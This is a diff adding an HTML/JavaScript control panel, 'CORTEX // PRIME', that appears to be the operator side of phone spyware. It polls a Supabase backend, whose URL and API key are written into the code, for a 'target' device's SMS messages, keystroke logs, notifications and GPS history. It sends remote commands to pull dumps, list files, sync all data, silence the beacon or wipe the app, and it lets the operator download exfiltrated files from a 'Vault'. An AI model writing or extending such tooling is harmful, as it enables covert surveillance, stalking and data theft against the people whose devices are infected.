@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CORTEX // PRIME</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #050505;
+            --surface: #0f1012;
+            --surface-light: #1a1c20;
+            --primary: #00f3ff;
+            --secondary: #7000ff;
+            --danger: #ff003c;
+            --success: #00ff9d;
+            --text: #c0c0c0;
+            --grid: rgba(0, 243, 255, 0.05);
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Share Tech Mono', monospace;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            background-image: 
+                linear-gradient(var(--grid) 1px, transparent 1px),
+                linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        /* --- HEADER --- */
+        header {
+            background: rgba(5, 5, 5, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 15px;
+            border-bottom: 1px solid var(--primary);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 10;
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.2);
+        }
+
+        .logo {
+            font-size: 1.2rem;
+            color: var(--primary);
+            text-shadow: 0 0 5px var(--primary);
+            letter-spacing: 2px;
+        }
+
+        .status-dot {
+            height: 8px;
+            width: 8px;
+            background-color: var(--danger);
+            border-radius: 50%;
+            box-shadow: 0 0 5px var(--danger);
+            animation: pulse 2s infinite;
+        }
+        .status-dot.online { background-color: var(--success); box-shadow: 0 0 5px var(--success); }
+
+        /* --- MAIN VIEWPORT --- */
+        main {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            padding-bottom: 80px; /* Space for nav */
+        }
+
+        /* --- SECTIONS --- */
+        .section { display: none; animation: fadeIn 0.3s ease; }
+        .section.active { display: block; }
+
+        h2 {
+            color: var(--bg);
+            background: var(--primary);
+            padding: 5px 10px;
+            display: inline-block;
+            font-size: 0.9rem;
+            margin-top: 0;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            clip-path: polygon(0 0, 100% 0, 90% 100%, 0% 100%);
+        }
+
+        /* --- CARDS --- */
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--surface-light);
+            border-left: 2px solid var(--primary);
+            padding: 15px;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .stat-item label { display: block; font-size: 0.7rem; color: #666; }
+        .stat-item span { font-size: 1.1rem; color: #fff; }
+
+        /* --- COMMAND DECK --- */
+        .cmd-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+
+        .btn {
+            background: var(--surface-light);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            padding: 15px;
+            font-family: inherit;
+            font-size: 0.9rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.2s;
+            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+        }
+
+        .btn:active { transform: scale(0.98); background: var(--primary); color: #000; }
+        .btn.danger { border-color: var(--danger); color: var(--danger); }
+        .btn.danger:active { background: var(--danger); color: #fff; }
+
+        .input-group {
+            display: flex;
+            margin-bottom: 10px;
+            gap: 5px;
+        }
+        
+        input {
+            flex: 1;
+            background: #000;
+            border: 1px solid var(--surface-light);
+            color: var(--primary);
+            padding: 10px;
+            font-family: inherit;
+        }
+
+        /* --- LOGS --- */
+        .log-entry {
+            font-size: 0.8rem;
+            padding: 8px;
+            border-bottom: 1px solid #222;
+            display: flex;
+            justify-content: space-between;
+        }
+        .log-entry:last-child { border: none; }
+        .log-time { color: #666; font-size: 0.7rem; }
+        .log-tag { color: var(--secondary); margin-right: 5px; }
+
+        /* --- BOTTOM NAV --- */
+        nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: var(--surface);
+            border-top: 1px solid #333;
+            display: flex;
+            justify-content: space-around;
+            padding: 15px 0;
+            z-index: 100;
+        }
+
+        .nav-item {
+            color: #666;
+            font-size: 1.5rem;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .nav-item.active { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+        .nav-item.active::after {
+            content: '';
+            position: absolute;
+            bottom: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 2px;
+            background: var(--primary);
+        }
+
+        /* --- LOADING OVERLAY --- */
+        #loader {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .scanline {
+            width: 100%;
+            height: 2px;
+            background: var(--primary);
+            position: absolute;
+            animation: scan 2s linear infinite;
+            opacity: 0.3;
+        }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+
+    </style>
+</head>
+<body>
+
+    <div id="loader">
+        <div style="color: var(--primary); font-size: 1.5rem; letter-spacing: 5px;">INITIALIZING...</div>
+        <div style="color: #666; margin-top: 10px; font-size: 0.8rem;">ESTABLISHING UPLINK</div>
+    </div>
+
+    <header>
+        <div class="logo">CORTEX // PRIME</div>
+        <div id="connectionStatus" class="status-dot"></div>
+    </header>
+
+    <main>
+        <!-- DASHBOARD VIEW -->
+        <div id="view-dash" class="section active">
+            <h2>Target Status</h2>
+            <div class="card">
+                <div class="stat-grid">
+                    <div class="stat-item">
+                        <label>DEVICE ID</label>
+                        <span id="stat-id">SEARCHING...</span>
+                    </div>
+                    <div class="stat-item">
+                        <label>MODEL</label>
+                        <span id="stat-model">---</span>
+                    </div>
+                    <div class="stat-item">
+                        <label>BATTERY</label>
+                        <span id="stat-batt" style="color: var(--success)">---%</span>
+                    </div>
+                    <div class="stat-item">
+                        <label>LAST SEEN</label>
+                        <span id="stat-seen">---</span>
+                    </div>
+                </div>
+            </div>
+
+            <h2>Live Feed</h2>
+            <div class="card" id="feed-container" style="max-height: 300px; overflow-y: auto;">
+                <div style="text-align: center; color: #444;">No Data Incoming</div>
+            </div>
+        </div>
+
+        <!-- COMMAND VIEW -->
+        <div id="view-cmd" class="section">
+            <h2>Tactical Control</h2>
+            
+            <div class="card">
+                <label style="color:var(--primary); font-size:0.8rem; margin-bottom:5px; display:block;">MESSAGING</label>
+                <div class="input-group">
+                    <input type="text" id="toast-input" placeholder="Message content...">
+                    <button class="btn" onclick="sendToast()">TOAST</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <label style="color:var(--primary); font-size:0.8rem; margin-bottom:5px; display:block;">DATA EXTRACTION</label>
+                <div class="cmd-grid">
+                    <button class="btn" onclick="sendCommand('UPLOAD_DUMPS')">PULL DUMPS</button>
+                    <button class="btn" onclick="sendCommand('GET_SKELETON')">FILE TREE</button>
+                    <button class="btn" onclick="sendCommand('FORCE_UPLOAD', 'ALL')">SYNC ALL</button>
+                    <button class="btn" onclick="sendCommand('IM_ONLINE', '0')">PING</button>
+                </div>
+            </div>
+
+            <div class="card" style="border-color: var(--danger);">
+                <label style="color:var(--danger); font-size:0.8rem; margin-bottom:5px; display:block;">DANGER ZONE</label>
+                <div class="cmd-grid">
+                    <button class="btn danger" onclick="sendCommand('STOP_BEACON')">SILENCE</button>
+                    <button class="btn danger" onclick="if(confirm('CONFIRM SELF DESTRUCT? THIS CANNOT BE UNDONE.')) sendCommand('NUKE')">NUKE APP</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- FILES VIEW -->
+        <div id="view-files" class="section">
+            <h2>The Vault</h2>
+            <div id="file-list">
+                <!-- File cards go here -->
+            </div>
+        </div>
+    </main>
+
+    <div class="scanline"></div>
+
+    <nav>
+        <div class="nav-item active" onclick="switchTab('dash')">📊</div>
+        <div class="nav-item" onclick="switchTab('cmd')">🎮</div>
+        <div class="nav-item" onclick="switchTab('files')">💾</div>
+    </nav>
+
+    <script>
+        // CONFIGURATION
+        const SUPABASE_URL = 'https://xvldfsmxskhemkslsbym.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU';
+        
+        const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        let currentDeviceId = null;
+
+        // --- INIT ---
+        window.onload = async () => {
+            setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 1500);
+            await fetchLatestDevice();
+            setInterval(fetchLatestDevice, 5000); // Polling every 5s
+            setInterval(fetchFiles, 10000);
+        };
+
+        function switchTab(tab) {
+            document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            document.getElementById('view-' + tab).classList.add('active');
+            
+            // Highlight nav icon (simple index logic)
+            const icons = ['dash', 'cmd', 'files'];
+            document.querySelectorAll('.nav-item')[icons.indexOf(tab)].classList.add('active');
+        }
+
+        // --- DATA FETCHING ---
+        async function fetchLatestDevice() {
+            const { data, error } = await sb
+                .from('device_stats')
+                .select('*')
+                .order('created_at', { ascending: false })
+                .limit(1);
+
+            if (data && data.length > 0) {
+                const dev = data[0];
+                currentDeviceId = dev.device_id;
+                
+                // Update UI
+                document.getElementById('stat-id').innerText = dev.device_id.substring(0, 8) + '...';
+                document.getElementById('stat-model').innerText = dev.device_model || 'UNKNOWN';
+                document.getElementById('stat-batt').innerText = (dev.battery_level || 0) + '%';
+                
+                // Time logic
+                const lastSeen = new Date(dev.created_at);
+                const now = new Date();
+                const diff = Math.floor((now - lastSeen) / 1000); // seconds
+                
+                let timeStr = diff + 's ago';
+                if (diff > 60) timeStr = Math.floor(diff/60) + 'm ago';
+                document.getElementById('stat-seen').innerText = timeStr;
+
+                // Status Dot
+                const dot = document.getElementById('connectionStatus');
+                if (diff < 60) {
+                    dot.classList.add('online');
+                    dot.style.boxShadow = "0 0 10px var(--success)";
+                } else {
+                    dot.classList.remove('online');
+                    dot.style.boxShadow = "0 0 5px var(--danger)";
+                }
+
+                // Logs Feed
+                updateFeed(dev);
+            }
+        }
+
+        function updateFeed(dev) {
+            const container = document.getElementById('feed-container');
+            let html = '';
+
+            // Merge sources
+            const logs = [];
+            
+            if (dev.sms_logs) dev.sms_logs.forEach(x => logs.push({type: 'SMS', txt: `Fr: ${x.sender} - ${x.body.substring(0,20)}...`, ts: x.timestamp}));
+            if (dev.typing_history) dev.typing_history.forEach(x => logs.push({type: 'KEY', txt: `[${x.pkg}] ${x.txt}`, ts: x.end_ts}));
+            if (dev.notif_history) dev.notif_history.forEach(x => logs.push({type: 'NTF', txt: `${x.title}: ${x.txt.substring(0,20)}`, ts: x.ts}));
+            if (dev.location_history) dev.location_history.forEach(x => logs.push({type: 'GPS', txt: `${x.lat.toFixed(4)}, ${x.lon.toFixed(4)}`, ts: x.ts}));
+
+            // Sort and take top 10
+            logs.sort((a,b) => b.ts - a.ts);
+            logs.slice(0, 20).forEach(log => {
+                const date = new Date(log.ts);
+                const time = `${date.getHours()}:${date.getMinutes().toString().padStart(2, '0')}`;
+                let color = '#fff';
+                if(log.type === 'SMS') color = 'var(--success)';
+                if(log.type === 'KEY') color = 'var(--primary)';
+                if(log.type === 'GPS') color = 'var(--secondary)';
+
+                html += `
+                    <div class="log-entry">
+                        <div><span class="log-tag" style="color:${color}">[${log.type}]</span> ${log.txt}</div>
+                        <div class="log-time">${time}</div>
+                    </div>
+                `;
+            });
+
+            if (html) container.innerHTML = html;
+        }
+
+        // --- COMMANDS ---
+        async function sendCommand(type, content = '') {
+            if (!currentDeviceId) return alert("NO UPLINK FOUND");
+            
+            const { error } = await sb.from('file_commands').insert({
+                device_id: currentDeviceId,
+                file_name: type,
+                content: content,
+                status: 'PENDING'
+            });
+
+            if (error) alert("CMD FAILED: " + error.message);
+            else {
+                const btn = event.target;
+                const originalText = btn.innerText;
+                btn.innerText = "SENT >>";
+                setTimeout(() => btn.innerText = originalText, 2000);
+            }
+        }
+
+        function sendToast() {
+            const txt = document.getElementById('toast-input').value;
+            if(txt) sendCommand('TOAST', txt);
+        }
+
+        // --- FILES ---
+        async function fetchFiles() {
+            // Looking for entries with Trigger = FILE_UPLOAD or non-empty filename
+            const { data } = await sb
+                .from('device_stats')
+                .select('id, created_at, filename, file_data')
+                .eq('trigger', 'FILE_UPLOAD')
+                .order('created_at', { ascending: false })
+                .limit(20);
+
+            const list = document.getElementById('file-list');
+            if (!data || data.length === 0) {
+                list.innerHTML = '<div style="text-align:center; padding:20px; color:#444;">VAULT EMPTY</div>';
+                return;
+            }
+
+            list.innerHTML = '';
+            data.forEach(file => {
+                if (!file.filename) return;
+                
+                const div = document.createElement('div');
+                div.className = 'card';
+                div.style.display = 'flex';
+                div.style.justifyContent = 'space-between';
+                div.style.alignItems = 'center';
+                
+                div.innerHTML = `
+                    <div>
+                        <div style="color: var(--primary); font-weight:bold;">${file.filename}</div>
+                        <div style="font-size:0.7rem; color:#666;">${new Date(file.created_at).toLocaleString()}</div>
+                    </div>
+                    <button class="btn" style="padding:5px 10px; font-size:0.8rem;">DL</button>
+                `;
+                
+                div.querySelector('button').onclick = () => downloadFile(file.filename, file.file_data);
+                list.appendChild(div);
+            });
+        }
+
+        function downloadFile(filename, base64) {
+            try {
+                const byteCharacters = atob(base64);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], {type: "application/octet-stream"});
+                
+                const link = document.createElement('a');
+                link.href = window.URL.createObjectURL(blob);
+                link.download = filename;
+                link.click();
+            } catch (e) {
+                alert("DECRYPTION FAILED: File might be corrupted.");
+            }
+        }
+
+    </script>
+</body>
+</html>
